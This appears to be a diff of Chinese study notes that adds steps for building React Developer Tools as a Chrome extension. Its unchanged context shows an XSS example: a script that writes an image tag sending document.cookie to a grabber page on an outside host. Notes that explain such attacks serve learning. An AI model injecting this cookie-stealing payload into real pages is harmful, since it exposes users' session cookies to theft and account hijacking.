@@ -90,7 +90,13 @@
          <script>
            document.write('<img src=http://www.hackerhome.com/grabber.jsp?msg=' + document.cookie+' width=16 height=16 border=0 />');
          </script>
-         
+    
+    7.下载React-developer-tools 辅助工具
+        https://github.com/facebook/react-devtools 在github上下载 .zip 安装包
+        进入到react-devtools-master文件夹，用npm安装依赖 ： npm --registry https://registry.npm.taobao.org install
+        安装依赖成功后，我们便可以打包一份扩展程序出来 ： npm run build:extension:chrome 
+        项目目录中生成一个新的文件夹，react-devtools -> shells -> chrome -> build -> unpacked文件夹
+        打开chrome扩展程序chrome://extensions/ ，加载已解压的扩展程序，选择第3步中的生成的unpacked文件夹
         
          
        
